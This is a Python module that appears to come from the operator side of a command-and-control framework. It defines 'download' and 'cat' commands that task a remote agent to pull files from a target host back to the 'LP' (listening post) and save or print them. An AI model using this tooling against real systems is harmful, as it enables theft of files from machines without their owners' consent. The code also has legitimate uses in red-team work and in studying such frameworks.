import re
import ntpath

from core.state import send_task
from core.state import TaskCode
from core import logging
from core.config import Paths

def finish_download(response, cache):
    if not response.success:
        logging.error("Failed to download file")
        return False

    if 'cat' in cache:
        logging.print(response.return_data.decode())
        return
        
    local_file = cache['local_file']

    try:
        with open(local_file, 'wb') as out_file:
            out_file.write(response.return_data)
        logging.success("Saved to {0}".format(local_file))
    except:
        logging.error("Failed to write to {0}".format(local_file))
        

def do_download(self, command):
    """
    Downloads a file from the remote agent to the LP

    Syntax:
        download <remotefile>
        download <remotefile> <localpath>
    """

    match = re.findall(r'^(.+?) ((?:C\:|~/|\./)+?.+?)$', command)

    if match:
        remote_file = match[0][0]
        local_file = match[0][1]
    else:
        remote_file = command
        local_file = Paths.Downloads + ntpath.basename(command)

    send_task(TaskCode.Download, argument1 = remote_file, cache = {'local_file': local_file})

def do_cat(self, command):
    """
    Prints out a file from the remote target (using download)

    Syntax:
        cat <remotefile>
    """

    send_task(TaskCode.Download, argument1 = command, cache = {'cat': True})

do_type = do_cat